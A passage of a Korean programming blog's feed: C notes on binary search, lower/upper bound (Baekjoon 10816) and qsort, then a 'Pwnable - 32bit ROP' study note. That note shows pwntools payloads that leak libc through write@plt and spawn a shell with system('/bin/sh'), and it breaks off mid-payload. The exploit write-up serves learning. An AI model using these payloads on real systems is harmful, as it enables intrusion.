Íµ¨ÌòÑÌï† Ïàò ÏûàÎã§.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://moz1e.tistory.com/15">https://moz1e.tistory.com/15</a> </li><li><a href="https://velog.io/@newon-seoul/%EB%AC%B8%EA%B3%BC%EC%83%9D%EC%9D%B4-%EC%A0%81%EC%96%B4%EB%B3%B4%EB%8A%94-%EB%B0%B1%ED%8A%B8%EB%9E%98%ED%82%B9-%EC%9E%AC%EA%B7%80%EC%99%80-DFS-%EB%A5%BC-%EA%B3%81%EB%93%A4%EC%9D%B8#%E2%91%A1-dfs-%ED%95%A8%EC%88%98">https://velog.io/@newon-seoul/%EB%AC%B8%EA%B3%BC%EC%83%9D%EC%9D%B4-%EC%A0%81%EC%96%B4%EB%B3%B4%EB%8A%94-%EB%B0%B1%ED%8A%B8%EB%9E%98%ED%82%B9-%EC%9E%AC%EA%B7%80%EC%99%80-DFS-%EB%A5%BC-%EA%B3%81%EB%93%A4%EC%9D%B8#%E2%91%A1-dfs-%ED%95%A8%EC%88%98</a></li><li><a href="https://www.acmicpc.net/board/view/53440">https://www.acmicpc.net/board/view/53440</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Docs </category>
          
          <category> Algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
            <tag> Baekjoon </tag>
            
            <tag> Recursion </tag>
            
            <tag> DFS </tag>
            
            <tag> Backtracking </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Algorithm - Lower bound, Upper bound (Baekjoon 10816, C)</title>
      <link href="/230201-algorithm-upper_lower/"/>
      <url>/230201-algorithm-upper_lower/</url>
      
        <content type="html"><![CDATA[<ul><li><p><a href="https://jiravvit.github.io/230123-alrorithm-binsearch/">https://jiravvit.github.io/230123-alrorithm-binsearch/</a> </p></li><li><p>ÏúÑÏùò Binary SearchÏóêÏÑú ÌååÏÉùÎê®, Îî∞ÎùºÏÑú Lower Bound, Upper Bound ÏïåÍ≥†Î¶¨Ï¶òÏùÄ Ï†ïÎ†¨Îêú Î∞∞Ïó¥Ïóê ÎåÄÌï¥ ÏÇ¨Ïö©Ïù¥ Í∞ÄÎä•Ìï®</p></li><li><p><strong>Binary Search</strong>: ÏõêÌïòÎäî Í∞í keyÎ•º Ï∞æÎäî Í≥ºÏ†ï</p></li><li><p><strong>Lower bound</strong>: ÏõêÌïòÎäî Í∞í key Ïù¥ÏÉÅÏù¥ Ï≤òÏùå ÎÇòÏò§Îäî ÏúÑÏπòÎ•º Ï∞æÎäî Í≥ºÏ†ï</p></li><li><p><strong>Upper bound</strong>: ÏõêÌïòÎäî Í∞í keyÎ•º Ï¥àÍ≥ºÌïú Í∞íÏù¥ Ï≤òÏùå ÎÇòÏò§Îäî ÏúÑÏπòÎ•º Ï∞æÎäî Í≥ºÏ†ï</p></li><li><p>Binary SearchÎäî ÏõêÌïòÎäî Í∞í keyÍ∞Ä ÏïÑÎãàÎ©¥ Î≥¥ÌÜµ -1ÏùÑ Î∞òÌôòÌï®.(Ïù¥ Ï†Ñ Í≤åÏãúÍ∏Ä Íµ¨ÌòÑÏóêÏÑúÎäî 0ÏùÑ Î∞òÌôòÌñàÏùå.) ÌïòÏßÄÎßå Lower boundÏôÄ Upper boundÎäî Ïñ¥ÎñªÍ≤åÎì† Ï†ÅÏ†àÌïú ÏúÑÏπòÎ•º Î∞òÌôòÌï®.</p></li></ul><h2 id="Lower-Bound"><a href="#Lower-Bound" class="headerlink" title="Lower Bound"></a>Lower Bound</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">lower_bound</span><span class="params">(<span class="type">int</span> data[], <span class="type">int</span> n, <span class="type">int</span> key)</span> &#123;</span><br><span class="line">    <span class="type">int</span> low, high, mid;</span><br><span class="line"></span><br><span class="line">    low = <span class="number">0</span>;</span><br><span class="line">    high = n<span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (low &lt; high) &#123;</span><br><span class="line">        mid = (low+high) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (key &lt;= data[mid]) </span><br><span class="line">            high = mid;</span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">            low = mid + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> high;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ÏõêÌïòÎäî Í∞í key Ïù¥ÏÉÅÏù¥Î©¥ keyÎèÑ Ìè¨Ìï®Ïù¥Îã§. Ï§ëÎ≥µÎêòÎäî key Ï§ëÏóêÏÑú Í∞ÄÏû• ÏûëÏùÄ Ïù∏Îç±Ïä§Î•º Í∞ÄÏ†∏Ïò®Îã§. Binary search ÏΩîÎìúÏóêÏÑú Ï°∞Í∏àÎßå Î≥ÄÌòïÏãúÏºúÏ£ºÎ©¥ ÎêúÎã§. </p><h2 id="Upper-Bound"><a href="#Upper-Bound" class="headerlink" title="Upper Bound"></a>Upper Bound</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">upper_bound</span><span class="params">(<span class="type">int</span> data[], <span class="type">int</span> n, <span class="type">int</span> key)</span> &#123;</span><br><span class="line">    <span class="type">int</span> low, high, mid;</span><br><span class="line"></span><br><span class="line">    low = <span class="number">0</span>;</span><br><span class="line">    high = n<span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (low &lt; high) &#123;</span><br><span class="line">        mid = (low+high) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (key &lt; data[mid]) </span><br><span class="line">            high = mid;</span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">            low = mid + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> high;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>low</code>, <code>high</code>, <code>mid</code>Îäî Î™®Îëê Ïù∏Îç±Ïä§Ïù¥Îã§.</p><p><code>key</code>Î≥¥Îã§ ÌÅ∞ Ï≤´ Î≤àÏß∏ ÏúÑÏπòÎ•º Ï∞æÏïÑÏïº ÌïúÎã§. <code>key</code>Í∞Ä <code>data[mid]</code>Î≥¥Îã§ ÏûëÏúºÎ©¥ <code>high</code>Î•º <code>mid</code>Î°ú ÎÇ¥Î¶∞Îã§. Í∑∏Îüº Ï†ÑÏ≤¥Ï†ÅÏù∏ Ïù∏Îç±Ïä§Îäî ÏôºÏ™ΩÏúºÎ°ú ÏÇ¥Ïßù ÏπòÏö∞Ïπú ÌòïÌÉúÏùº Í≤ÉÏù¥Îã§.</p><p><code>key</code>Í∞Ä <code>data[mid]</code>Î≥¥Îã§ Í∞íÍ±∞ÎÇò ÌÅ¨Î©¥ <code>low = mid + 1</code>ÏùÑ ÏàòÌñâÌïúÎã§. ÏâΩÍ≤å ÎßêÌï¥ <code>mid</code> Í∑∏ Îã§Ïùå Ïù∏Îç±Ïä§Î•º <code>low</code>Î°ú ÏßÄÏ†ïÌïúÎã§. </p><img src="/images/230201-algoritm-upper_lower/IMG_4027.png" width=500/><br><img src="/images/230201-algoritm-upper_lower/IMG_4028.png" width=500/><br><img src="/images/230201-algoritm-upper_lower/IMG_4029.png" width=500/><p>Í≤ÄÏ†ïÏÉâÏùÑ Î®ºÏ†Ä ÏùΩÍ≥† Îπ®Í∞ÑÏÉâÏùÑ ÏùΩÏúºÎ©¥ ÎêúÎã§. ÌååÎûÄÏÉâÏùÄ Ï∞∏Í≥†Ïù¥Îã§.</p><h2 id="Example-Î∞±Ï§Ä-10816-Ïà´ÏûêÏπ¥Îìú-2"><a href="#Example-Î∞±Ï§Ä-10816-Ïà´ÏûêÏπ¥Îìú-2" class="headerlink" title="Example (Î∞±Ï§Ä 10816 Ïà´ÏûêÏπ¥Îìú 2)"></a>Example (Î∞±Ï§Ä 10816 Ïà´ÏûêÏπ¥Îìú 2)</h2><ul><li><a href="https://www.acmicpc.net/problem/10816">https://www.acmicpc.net/problem/10816</a></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">compare</span><span class="params">(<span class="type">const</span> <span class="type">void</span>* a, <span class="type">const</span> <span class="type">void</span>* b)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (*(<span class="type">int</span>*)a &gt; *(<span class="type">int</span>*)b) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (*(<span class="type">int</span>*)a &lt; *(<span class="type">int</span>*)b) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">lower_bound</span><span class="params">(<span class="type">int</span> data[], <span class="type">int</span> n, <span class="type">int</span> key)</span> &#123;</span><br><span class="line">    <span class="type">int</span> low, high, mid;</span><br><span class="line"></span><br><span class="line">    low = <span class="number">0</span>;</span><br><span class="line">    high = n<span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (low &lt; high) &#123;</span><br><span class="line">        mid = (low+high) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (key &lt;= data[mid]) </span><br><span class="line">            high = mid;</span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">            low = mid + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> high;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">upper_bound</span><span class="params">(<span class="type">int</span> data[], <span class="type">int</span> n, <span class="type">int</span> key)</span> &#123;</span><br><span class="line">    <span class="type">int</span> low, high, mid;</span><br><span class="line"></span><br><span class="line">    low = <span class="number">0</span>;</span><br><span class="line">    high = n<span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (low &lt; high) &#123;</span><br><span class="line">        mid = (low+high) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (key &lt; data[mid]) </span><br><span class="line">            high = mid;</span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">            low = mid + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (data[high] == key) </span><br><span class="line">        <span class="keyword">return</span> high + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> high;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">    <span class="type">int</span> arr[n];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d &quot;</span>, &amp;arr[i]);</span><br><span class="line"></span><br><span class="line">    qsort(arr, n, <span class="keyword">sizeof</span>(<span class="type">int</span>), compare);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;m);</span><br><span class="line">    <span class="type">int</span> brr[m];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++)</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d &quot;</span>, &amp;brr[i]);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// lower_bound, upper_bound</span></span><br><span class="line">    <span class="type">int</span> lower, upper;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">        lower = lower_bound(arr, n, brr[i]);</span><br><span class="line">        upper = upper_bound(arr, n, brr[i]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, upper-lower);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Ïù¥ Î¨∏Ï†úÎ•º ÌíÄÍ∏∞ ÏúÑÌï¥ÏÑú <code>upper_bound</code> Ìï®ÏàòÏóêÏÑú ÏïÑÎûò Ï°∞Í±¥ÏùÑ Ï∂îÍ∞ÄÌï¥Ï§òÏïºÌïúÎã§.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (data[high] == key) </span><br><span class="line">    <span class="keyword">return</span> high + <span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>ÏôúÎÉêÌïòÎ©¥.. <code>upper_bound</code> Ìï®ÏàòÏùò Î∞òÌôò Í∞íÏùÄ key Í∞íÏùÑ Ï¥àÍ≥ºÌïòÎäî Ï≤´ Î≤àÏß∏ Í∞íÏùò Ïù∏Îç±Ïä§Ïù∏Îç∞ keyÍ∞Ä Ï†ïÎ†¨ÏóêÏÑú Í∞ÄÏû• ÌÅ∞ ÏàòÎùºÎ©¥ Î∞òÌôò Í∞íÏù¥ Ï°¥Ïû¨ÌïòÏßÄ ÏïäÍ∏∞ ÎñÑÎ¨∏Ïù¥Îã§. Í∑∏ÎûòÏÑú n-1ÏùÑ Î∞òÌôòÌïúÎã§. Ïù¥ Î¨∏Ï†úÎäî keyÏùò Í∞úÏàòÎ•º ÏïåÏïÑÎÇ¥Îäî Í≤ÉÏù¥ Î™©ÌëúÏù¥Í∏∞ ÎïåÎ¨∏Ïóê Ìï¥Îãπ Í≤ΩÏö∞ÏóêÎßå +1ÏùÑ Ìï¥Ï§òÏïº ÌïúÎã§. </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10 20 30 30 30 </span><br></pre></td></tr></table></figure><p>ÏòàÏãúÎ°ú ÏúÑÏùò Î∞∞Ïó¥ÏóêÏÑú 30Ïùò Í∞úÏàòÎäî <code>5-2 = 3</code> Ïù¥Ïñ¥Ïïº ÌïúÎã§.</p>]]></content>
      
      
      <categories>
          
          <category> Docs </category>
          
          <category> Algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
            <tag> binsearch </tag>
            
            <tag> Baekjoon </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Algorithm - Binary Search (C)</title>
      <link href="/230123-alrorithm-binsearch/"/>
      <url>/230123-alrorithm-binsearch/</url>
      
        <content type="html"><![CDATA[<ul><li>Ï†ïÎ†¨Îêú Î∞∞Ïó¥Ïóê ÎåÄÌï¥ ÏÇ¨Ïö© Í∞ÄÎä•</li></ul><h2 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">compare</span><span class="params">(<span class="type">const</span> <span class="type">void</span>* a, <span class="type">const</span> <span class="type">void</span>* b)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (*(<span class="type">int</span>*)a &gt; *(<span class="type">int</span>*)b) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (*(<span class="type">int</span>*)a &lt; *(<span class="type">int</span>*)b) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">binsearch</span><span class="params">(<span class="type">int</span> data[], <span class="type">int</span> n, <span class="type">int</span> key)</span> &#123;</span><br><span class="line">    <span class="type">int</span> low, high, mid;</span><br><span class="line"></span><br><span class="line">    low = <span class="number">0</span>;</span><br><span class="line">    high = n<span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (low &lt;= high) &#123;</span><br><span class="line">        mid = (low+high) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (key == data[mid]) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (key &lt; data[mid]) high = mid<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (key &gt; data[mid]) low = mid+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n, key;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">    <span class="type">int</span> arr[n];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;arr[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    qsort(arr, n, <span class="keyword">sizeof</span>(<span class="type">int</span>), compare);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, arr[j]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;key);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nfind key: %s\n&quot;</span>, binsearch(arr, n, key) ? <span class="string">&quot;Exist&quot;</span> : <span class="string">&quot;None&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>input</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">10</span><br><span class="line">9 2 6 5 1 7 3 4 8 1</span><br><span class="line">5</span><br></pre></td></tr></table></figure><ul><li>output</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1 1 2 3 4 5 6 7 8 9 </span><br><span class="line">find key: Exist</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Docs </category>
          
          <category> Algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
            <tag> binsearch </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Algorithm - Quick sort (C, qsort)</title>
      <link href="/230123-algorithm-qsort/"/>
      <url>/230123-algorithm-qsort/</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">void qsort (void *base, size_t nel, size_t width, int (*compare)(const void *, const void *);</span><br></pre></td></tr></table></figure><ul><li><code>stdlib.h</code></li><li><code>O(nlogn)</code> (ÏµúÏïÖ: <code>O(n^2)</code>)</li></ul><h2 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">compare</span><span class="params">(<span class="type">const</span> <span class="type">void</span>* a, <span class="type">const</span> <span class="type">void</span>* b)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (*(<span class="type">int</span>*)a &gt; *(<span class="type">int</span>*)b) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (*(<span class="type">int</span>*)a &lt; *(<span class="type">int</span>*)b) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">    <span class="type">int</span> arr[n];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;arr[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    qsort(arr, n, <span class="keyword">sizeof</span>(<span class="type">int</span>), compare);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, arr[j]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>input</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">10</span><br><span class="line">9 2 6 5 1 7 3 4 8 1</span><br></pre></td></tr></table></figure><ul><li>output</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 1 2 3 4 5 6 7 8 9</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Docs </category>
          
          <category> Algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
            <tag> qsort </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwnable - 32bit ROP</title>
      <link href="/230119-pwn-32bitrop/"/>
      <url>/230119-pwn-32bitrop/</url>
      
        <content type="html"><![CDATA[<ul><li>x86 calling convention<ul><li>The caller places all arguments to the callee on the <code>stack</code></li><li>Arguments are pushed to the <code>stack</code></li><li>Stack cleanup is performed by the calle<br></li></ul></li><li>rip control</li><li><code>/bin/sh\x00</code> address</li><li>leak the libc address. (e.g <code>got</code>)</li><li>got overwriting</li><li>argument control? -&gt; <code>pop [reg] ; ret</code> gadget address (Role is to add <code>esp</code>)</li></ul><h2 id="Libc-Leak"><a href="#Libc-Leak" class="headerlink" title="Libc Leak"></a>Libc Leak</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x88</span>+<span class="number">0x4</span>) <span class="comment"># (dummy + ebp)</span></span><br><span class="line"></span><br><span class="line">payload += p32(e.plt[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line">payload += p32(pppr)</span><br><span class="line">payload += p32(<span class="number">1</span>)</span><br><span class="line">payload += p32(e.got[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line">payload += p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">payload += p32(e.sym[<span class="string">&#x27;main&#x27;</span>]) <span class="comment"># ret2main</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input:\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">leak = struct.unpack(<span class="string">&#x27;I&#x27;</span>, p.recv(<span class="number">4</span>))[<span class="number">0</span>] </span><br><span class="line">info(<span class="built_in">hex</span>(leak))</span><br></pre></td></tr></table></figure><h2 id="Execute-system-39-bin-sh-x00-39"><a href="#Execute-system-39-bin-sh-x00-39" class="headerlink" title="Execute system(&#39;/bin/sh\x00&#39;)"></a>Execute <code>system(&#39;/bin/sh\x00&#39;)</code></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># restart main</span></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x88</span>+<span class="number">0x4</span>) <span class="comment"># (dummy + ebp)</span></span><br><span class="line"></span><br><span class="line">payload += p32(system)</span><br><span class="line">payload += <span class="string">b&#x27;B&#x27;</span> * <span class="number">0x4</span></span><br><span class="line">payload += p32(binsh)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input:\n&#x27;</span>, 